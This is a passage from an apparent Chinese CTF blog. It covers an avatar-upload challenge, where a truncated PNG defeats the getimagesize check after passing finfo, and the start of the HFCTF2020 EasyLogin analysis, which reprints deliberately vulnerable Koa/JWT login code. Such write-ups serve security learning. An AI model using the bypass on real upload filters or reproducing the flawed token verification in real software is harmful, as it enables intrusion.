alt="avauploader3"></p><p>看到有个<code>type:error</code>，唉不会还是要找密钥解题吧。。</p><p>后面看了下<code>wp</code>，发现原题是给了源码的</p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;config.php&#x27;</span>);<br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;lib/util.php&#x27;</span>);<br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;lib/session.php&#x27;</span>);<br><br><span class="hljs-variable">$session</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SecureClientSession</span>(CLIENT_SESSION_ID, SECRET_KEY);<br><br><span class="hljs-comment">// check whether file is uploaded</span><br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]) || !<span class="hljs-title function_ invoke__">is_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>])) &#123;<br> <span class="hljs-title function_ invoke__">error</span>(<span class="hljs-string">&#x27;No file was uploaded.&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">// check file size</span><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;size&#x27;</span>] &gt; <span class="hljs-number">256000</span>) &#123;<br> <span class="hljs-title function_ invoke__">error</span>(<span class="hljs-string">&#x27;Uploaded file is too large.&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">// check file type</span><br><span class="hljs-variable">$finfo</span> = <span class="hljs-title function_ invoke__">finfo_open</span>(FILEINFO_MIME_TYPE);<br><span class="hljs-variable">$type</span> = <span class="hljs-title function_ invoke__">finfo_file</span>(<span class="hljs-variable">$finfo</span>, <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]);<br><span class="hljs-title function_ invoke__">finfo_close</span>(<span class="hljs-variable">$finfo</span>);<br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$type</span>, [<span class="hljs-string">&#x27;image/png&#x27;</span>])) &#123;<br> <span class="hljs-title function_ invoke__">error</span>(<span class="hljs-string">&#x27;Uploaded file is not PNG format.&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">// check file width/height</span><br><span class="hljs-variable">$size</span> = <span class="hljs-title function_ invoke__">getimagesize</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$size</span>[<span class="hljs-number">0</span>] &gt; <span class="hljs-number">256</span> || <span class="hljs-variable">$size</span>[<span class="hljs-number">1</span>] &gt; <span class="hljs-number">256</span>) &#123;<br> <span class="hljs-title function_ invoke__">error</span>(<span class="hljs-string">&#x27;Uploaded image is too large.&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$size</span>[<span class="hljs-number">2</span>] !== IMAGETYPE_PNG) &#123;<br> <span class="hljs-comment">// I hope this never happens...</span><br> <span class="hljs-title function_ invoke__">error</span>(<span class="hljs-string">&#x27;What happened...? OK, the flag for part 1 is: &lt;code&gt;&#x27;</span> . <span class="hljs-title function_ invoke__">getenv</span>(<span class="hljs-string">&#x27;FLAG1&#x27;</span>) . <span class="hljs-string">&#x27;&lt;/code&gt;&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">// ok</span><br><span class="hljs-variable">$filename</span> = <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-title function_ invoke__">random_bytes</span>(<span class="hljs-number">4</span>)) . <span class="hljs-string">&#x27;.png&#x27;</span>;<br><span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>], UPLOAD_DIR . <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$filename</span>);<br><br><span class="hljs-variable">$session</span>-&gt;<span class="hljs-title function_ invoke__">set</span>(<span class="hljs-string">&#x27;avatar&#x27;</span>, <span class="hljs-variable">$filename</span>);<br><span class="hljs-title function_ invoke__">flash</span>(<span class="hljs-string">&#x27;info&#x27;</span>, <span class="hljs-string">&#x27;Your avatar has been successfully updated!&#x27;</span>);<br><span class="hljs-title function_ invoke__">redirect</span>(<span class="hljs-string">&#x27;/&#x27;</span>);<br></code></pre></td></tr></table></figure><p>注意这两部分：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$type</span>, [<span class="hljs-string">&#x27;image/png&#x27;</span>])) &#123;<br> <span class="hljs-title function_ invoke__">error</span>(<span class="hljs-string">&#x27;Uploaded file is not PNG format.&#x27;</span>);<br> <span class="hljs-keyword">if</span> (<span class="hljs-variable">$size</span>[<span class="hljs-number">2</span>] !== IMAGETYPE_PNG) &#123;<br> <span class="hljs-comment">// I hope this never happens...</span><br> <span class="hljs-title function_ invoke__">error</span>(<span class="hljs-string">&#x27;What happened...? OK, the flag for part 1 is: &lt;code&gt;&#x27;</span> . <span class="hljs-title function_ invoke__">getenv</span>(<span class="hljs-string">&#x27;FLAG1&#x27;</span>) . <span class="hljs-string">&#x27;&lt;/code&gt;&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>finfo</code>函数判断要求图片形式是<code>PNG</code>，但接下来<code>getimagesize</code>函数要求图片形式不能是<code>PNG</code>。这里也用不着上传马，只要上传满足上面要求的图片就行。然后会把结果放到<code>JWT</code>里。</p><p>这里应该有什么绕过姿势，参考：<code>https://blog.csdn.net/weixin_44037296/article/details/112604812</code></p><blockquote><p>函数<code>finfo_file()</code>其主要是识别<strong>PNG</strong>文件十六进制下的第一行信息，可以将png图片的第一行保留，其他全删掉，这样<code>finfo_file</code>获取到的是png，而<code>getimagesize</code>获取不到图片的相关信息<br>然后上传</p></blockquote><p>直接在burp里删就行，内容截止到<code>IDHR</code>:</p><p><img src="/img/avauploader5.png" alt="avauploader5"></p><p><img src="/img/avauploader6.png" alt="avauploader6"></p>]]></content>
    
    
    
    <tags>
      
      <tag>做题记录</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BuuCTF做题记录_7</title>
    <link href="/2023/12/27/BuuCTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95_7/"/>
    <url>/2023/12/27/BuuCTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95_7/</url>
    
    <content type="html"><![CDATA[<p>初学者的一些做题记录</p><span id="more"></span><hr><h2 id="HFCTF2020-EasyLogin"><a href="#HFCTF2020-EasyLogin" class="headerlink" title="[HFCTF2020]EasyLogin"></a>[HFCTF2020]EasyLogin</h2><p><img src="/img/hfctf2020ezlogin1.png" alt="hfctf2020ezlogin1"></p><p>源码中存在<code>/static/js/app.js</code>:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> *  或许该用 koa-static 来处理静态文件</span><br><span class="hljs-comment"> *  路径该怎么配置？不管了先填个根目录XD</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">login</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">const</span> username = $(<span class="hljs-string">&quot;#username&quot;</span>).<span class="hljs-title function_">val</span>();<br>    <span class="hljs-keyword">const</span> password = $(<span class="hljs-string">&quot;#password&quot;</span>).<span class="hljs-title function_">val</span>();<br>    <span class="hljs-keyword">const</span> token = <span class="hljs-variable language_">sessionStorage</span>.<span class="hljs-title function_">getItem</span>(<span class="hljs-string">&quot;token&quot;</span>);<br>    $.<span class="hljs-title function_">post</span>(<span class="hljs-string">&quot;/api/login&quot;</span>, &#123;username, password, <span class="hljs-attr">authorization</span>:token&#125;)<br>        .<span class="hljs-title function_">done</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>) &#123;<br>            <span class="hljs-keyword">const</span> &#123;status&#125; = data;<br>            <span class="hljs-keyword">if</span>(status) &#123;<br>                <span class="hljs-variable language_">document</span>.<span class="hljs-property">location</span> = <span class="hljs-string">&quot;/home&quot;</span>;<br>            &#125;<br>        &#125;)<br>        .<span class="hljs-title function_">fail</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">xhr, textStatus, errorThrown</span>) &#123;<br>            <span class="hljs-title function_">alert</span>(xhr.<span class="hljs-property">responseJSON</span>.<span class="hljs-property">message</span>);<br>        &#125;);<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">register</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">const</span> username = $(<span class="hljs-string">&quot;#username&quot;</span>).<span class="hljs-title function_">val</span>();<br>    <span class="hljs-keyword">const</span> password = $(<span class="hljs-string">&quot;#password&quot;</span>).<span class="hljs-title function_">val</span>();<br>    $.<span class="hljs-title function_">post</span>(<span class="hljs-string">&quot;/api/register&quot;</span>, &#123;username, password&#125;)<br>        .<span class="hljs-title function_">done</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>) &#123;<br>            <span class="hljs-keyword">const</span> &#123; token &#125; = data;<br>            <span class="hljs-variable language_">sessionStorage</span>.<span class="hljs-title function_">setItem</span>(<span class="hljs-string">&#x27;token&#x27;</span>, token);<br>            <span class="hljs-variable language_">document</span>.<span class="hljs-property">location</span> = <span class="hljs-string">&quot;/login&quot;</span>;<br>        &#125;)<br>        .<span class="hljs-title function_">fail</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">xhr, textStatus, errorThrown</span>) &#123;<br>            <span class="hljs-title function_">alert</span>(xhr.<span class="hljs-property">responseJSON</span>.<span class="hljs-property">message</span>);<br>        &#125;);<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">logout</span>(<span class="hljs-params"></span>) &#123;<br>    $.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/api/logout&#x27;</span>).<span class="hljs-title function_">done</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>) &#123;<br>        <span class="hljs-keyword">const</span> &#123;status&#125; = data;<br>        <span class="hljs-keyword">if</span>(status) &#123;<br>            <span class="hljs-variable language_">document</span>.<span class="hljs-property">location</span> = <span class="hljs-string">&#x27;/login&#x27;</span>;<br>        &#125;<br>    &#125;);<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">getflag</span>(<span class="hljs-params"></span>) &#123;<br>    $.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/api/flag&#x27;</span>).<span class="hljs-title function_">done</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>) &#123;<br>        <span class="hljs-keyword">const</span> &#123;flag&#125; = data;<br>        $(<span class="hljs-string">&quot;#username&quot;</span>).<span class="hljs-title function_">val</span>(flag);<br>    &#125;).<span class="hljs-title function_">fail</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">xhr, textStatus, errorThrown</span>) &#123;<br>        <span class="hljs-title function_">alert</span>(xhr.<span class="hljs-property">responseJSON</span>.<span class="hljs-property">message</span>);<br>    &#125;);<br>&#125;<br></code></pre></td></tr></table></figure><p>能正常访问，初步猜测是源码泄露？</p><p>有关<code>koa-static</code>的目录结构，参考：<code>(https://blog.csdn.net/fmyyy1/article/details/115674235)</code></p><p><img src="/img/hfctf2020ezlogin2.png" alt="hfctf2020ezlogin2"></p><p><code>app.js/</code>:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> <span class="hljs-title class_">Koa</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;koa&#x27;</span>);<br><span class="hljs-keyword">const</span> bodyParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;koa-bodyparser&#x27;</span>);<br><span class="hljs-keyword">const</span> session = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;koa-session&#x27;</span>);<br><span class="hljs-keyword">const</span> <span class="hljs-keyword">static</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;koa-static&#x27;</span>);<br><span class="hljs-keyword">const</span> views = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;koa-views&#x27;</span>);<br><br><span class="hljs-keyword">const</span> crypto = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;crypto&#x27;</span>);<br><span class="hljs-keyword">const</span> &#123; resolve &#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;path&#x27;</span>);<br><br><span class="hljs-keyword">const</span> rest = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./rest&#x27;</span>);<br><span class="hljs-keyword">const</span> controller = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./controller&#x27;</span>);<br><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">PORT</span> = <span class="hljs-number">3000</span>;<br><span class="hljs-keyword">const</span> app = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Koa</span>();<br><br>app.<span class="hljs-property">keys</span> = [crypto.<span class="hljs-title function_">randomBytes</span>(<span class="hljs-number">16</span>).<span class="hljs-title function_">toString</span>(<span class="hljs-string">&#x27;hex&#x27;</span>)];<br><span class="hljs-variable language_">global</span>.<span class="hljs-property">secrets</span> = [];<br><br>app.<span class="hljs-title function_">use</span>(<span class="hljs-title function_">static</span>(<span class="hljs-title function_">resolve</span>(__dirname, <span class="hljs-string">&#x27;.&#x27;</span>)));<br><br>app.<span class="hljs-title function_">use</span>(<span class="hljs-title function_">views</span>(<span class="hljs-title function_">resolve</span>(__dirname, <span class="hljs-string">&#x27;./views&#x27;</span>), &#123;<br>  <span class="hljs-attr">extension</span>: <span class="hljs-string">&#x27;pug&#x27;</span><br>&#125;));<br><br>app.<span class="hljs-title function_">use</span>(<span class="hljs-title function_">session</span>(&#123;<span class="hljs-attr">key</span>: <span class="hljs-string">&#x27;sses:aok&#x27;</span>, <span class="hljs-attr">maxAge</span>: <span class="hljs-number">86400000</span>&#125;, app));<br><br><span class="hljs-comment">// parse request body:</span><br>app.<span class="hljs-title function_">use</span>(<span class="hljs-title function_">bodyParser</span>());<br><br><span class="hljs-comment">// prepare restful service</span><br>app.<span class="hljs-title function_">use</span>(rest.<span class="hljs-title function_">restify</span>());<br><br><span class="hljs-comment">// add controllers:</span><br>app.<span class="hljs-title function_">use</span>(<span class="hljs-title function_">controller</span>());<br><br>app.<span class="hljs-title function_">listen</span>(<span class="hljs-variable constant_">PORT</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`app started at port <span class="hljs-subst">$&#123;PORT&#125;</span>...`</span>);<br></code></pre></td></tr></table></figure><p>不是很懂为啥去访问<code>controllers/api.js</code>。。。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> crypto = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;crypto&#x27;</span>);<br><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>)<br><span class="hljs-keyword">const</span> jwt = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;jsonwebtoken&#x27;</span>)<br><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">APIError</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;../rest&#x27;</span>).<span class="hljs-property">APIError</span>;<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>    <span class="hljs-string">&#x27;POST /api/register&#x27;</span>: <span class="hljs-keyword">async</span> (ctx, next) =&gt; &#123;<br>        <span class="hljs-keyword">const</span> &#123;username, password&#125; = ctx.<span class="hljs-property">request</span>.<span class="hljs-property">body</span>;<br><br>        <span class="hljs-keyword">if</span>(!username || username === <span class="hljs-string">&#x27;admin&#x27;</span>)&#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">APIError</span>(<span class="hljs-string">&#x27;register error&#x27;</span>, <span class="hljs-string">&#x27;wrong username&#x27;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">global</span>.<span class="hljs-property">secrets</span>.<span class="hljs-property">length</span> &gt; <span class="hljs-number">100000</span>) &#123;<br>            <span class="hljs-variable language_">global</span>.<span class="hljs-property">secrets</span> = [];<br>        &#125;<br><br>        <span class="hljs-keyword">const</span> secret = crypto.<span class="hljs-title function_">randomBytes</span>(<span class="hljs-number">18</span>).<span class="hljs-title function_">toString</span>(<span class="hljs-string">&#x27;hex&#x27;</span>);<br>        <span class="hljs-keyword">const</span> secretid = <span class="hljs-variable language_">global</span>.<span class="hljs-property">secrets</span>.<span class="hljs-property">length</span>;<br>        <span class="hljs-variable language_">global</span>.<span class="hljs-property">secrets</span>.<span class="hljs-title function_">push</span>(secret)<br><br>        <span class="hljs-keyword">const</span> token = jwt.<span class="hljs-title function_">sign</span>(&#123;secretid, username, password&#125;, secret, &#123;<span class="hljs-attr">algorithm</span>: <span class="hljs-string">&#x27;HS256&#x27;</span>&#125;);<br><br>        ctx.<span class="hljs-title function_">rest</span>(&#123;<br>            <span class="hljs-attr">token</span>: token<br>        &#125;);<br><br>        <span class="hljs-keyword">await</span> <span class="hljs-title function_">next</span>();<br>    &#125;,<br><br>    <span class="hljs-string">&#x27;POST /api/login&#x27;</span>: <span class="hljs-keyword">async</span> (ctx, next) =&gt; &#123;<br>        <span class="hljs-keyword">const</span> &#123;username, password&#125; = ctx.<span class="hljs-property">request</span>.<span class="hljs-property">body</span>;<br><br>        <span class="hljs-keyword">if</span>(!username || !password) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">APIError</span>(<span class="hljs-string">&#x27;login error&#x27;</span>, <span class="hljs-string">&#x27;username or password is necessary&#x27;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">const</span> token = ctx.<span class="hljs-property">header</span>.<span class="hljs-property">authorization</span> || ctx.<span class="hljs-property">request</span>.<span class="hljs-property">body</span>.<span class="hljs-property">authorization</span> || ctx.<span class="hljs-property">request</span>.<span class="hljs-property">query</span>.<span class="hljs-property">authorization</span>;<br><br>        <span class="hljs-keyword">const</span> sid = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(<span class="hljs-title class_">Buffer</span>.<span class="hljs-title function_">from</span>(token.<span class="hljs-title function_">split</span>(<span class="hljs-string">&#x27;.&#x27;</span>)[<span class="hljs-number">1</span>], <span class="hljs-string">&#x27;base64&#x27;</span>).<span class="hljs-title function_">toString</span>()).<span class="hljs-property">secretid</span>;<br><br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(sid)<br><br>        <span class="hljs-keyword">if</span>(sid === <span class="hljs-literal">undefined</span> || sid === <span class="hljs-literal">null</span> || !(sid &lt; <span class="hljs-variable language_">global</span>.<span class="hljs-property">secrets</span>.<span class="hljs-property">length</span> &amp;&amp; sid &gt;= <span class="hljs-number">0</span>)) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">APIError</span>(<span class="hljs-string">&#x27;login error&#x27;</span>, <span class="hljs-string">&#x27;no such secret id&#x27;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">const</span> secret = <span class="hljs-variable language_">global</span>.<span class="hljs-property">secrets</span>[sid];<br><br>        <span class="hljs-keyword">const</span> user = jwt.<span class="hljs-title function_">verify</span>(token, secret, &#123;<span class="hljs-attr">algorithm</span>: <span class="hljs-string">&#x27;HS256&#x27;</span>&#125;);<br><br>        <span class="hljs-keyword">const</span> status = username === user.<span class="hljs-property">username</span> &amp;&amp; password === user.<span class="hljs-property">password</span>;<br><br>        <span class="hljs-keyword">if</span>(status) &#123;<br>            ctx.<span class="hljs-property">session</span>.<span class="hljs-property">username</span> = username;<br>        &#125;<br><br>        ctx.<span class="hljs-title function_">rest</span>(&#123;<br>            status<br>        &#125;);<br><br>        <span class="hljs-keyword">await</span> <span class="hljs-title function_">next</span>();<br>    &#125;,<br><br>    <span class="hljs-string">&#x27;GET /api/flag&#x27;</span>: <span class="hljs-keyword">async</span> (ctx, next) =&gt; &#123;<br>        <span class="hljs-keyword">if</span>(ctx.<span class="hljs-property">session</span>.<span class="hljs-property">username</span> !== <span class="hljs-string">&#x27;admin&#x27;</span>)&#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">APIError</span>(<span class="hljs-string">&#x27;permission error&#x27;</span>, <span class="hljs-string">&#x27;permission denied&#x27;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">const</span> flag = fs.<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>).<span class="hljs-title function_">toString</span>();<br>        ctx.<span class="hljs-title function_">rest</span>(&#123;<br>            flag<br>        &#125;);<br><br>        <span class="hljs-keyword">await</span> <span class="hljs-title function_">next</span>();<br>    &#125;,<br><br>    <span class="hljs-string">&#x27;GET /api/logout&#x27;</span>: <span class="hljs-keyword">async</span> (ctx, next) =&gt; &#123;<br>        ctx.<span class="hljs-property">session</span>.<span class="hljs-property">username</span> = <span class="hljs-literal">null</span>;<br>        ctx.<span class="hljs-title function_">rest</span>(&#123;<br>            <span class="hljs-attr">status</span>: <span class="hljs-literal">true</span><br>        &#125;)<br>        <span class="hljs-keyword">await</span> <span class="hljs-title function_">next</span>();<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p>先看对用户名的限制部分：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">if</span>(!username || username === <span class="hljs-string">&#x27;admin&#x27;</span>)&#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">APIError</span>(<span class="hljs-string">&#x27;register error&#x27;</span>, <span class="hljs-string">&#x27;wrong username&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>这里规定<code>username</code>不能为空或不能强等于<code>admin</code>，否则会抛出一个异常。</p><p><code>JWT</code>的构造部分：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> secret = crypto.<span class="hljs-title function_">randomBytes</span>(<span class="hljs-number">18</span>).<span class="hljs-title function_">toString</span>(<span class="hljs-string">&#x27;hex&#x27;</span>);<br><span class="hljs-keyword">const</span> secretid = <span class="hljs-variable language_">global</span>.<span class="hljs-property">secrets</span>.<span class="hljs-property">length</span>;<br><span class="hljs-variable language_">global</span>.<span class="hljs-property">secrets</span>.<span class="hljs-title function_">push</span>(secret)<br><br><span class="hljs-keyword">const</span> token = jwt.<span class="hljs-title function_">sign</span>(&#123;secretid, username, password&#125;, secret, &#123;<span class="hljs-attr">algorithm</span>: <span class="hljs-string">&#x27;HS256&#x27;</span>&#125;);<br></code></pre></td></tr></table></figure><p>简单说就是随机生成一串十六进制字符串，然后把它的长度赋值给<code>secretid</code>。第三行就是去生成<code>JSON Web Token</code>：</p><p><img src="/img/hfctf2020ezlogin3.png" alt="hfctf2020ezlogin3"></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> token = ctx.<span class="hljs-property">header</span>.<span class="hljs-property">authorization</span> || ctx.<span class="hljs-property">request</span>.<span class="hljs-property">body</span>.<span class="hljs-property">authorization</span> || ctx.<span class="hljs-property">request</span>.<span class="hljs-property">query</span>.<span class="hljs-property">authorization</span>;<br><br><span class="hljs-keyword">const</span> sid = 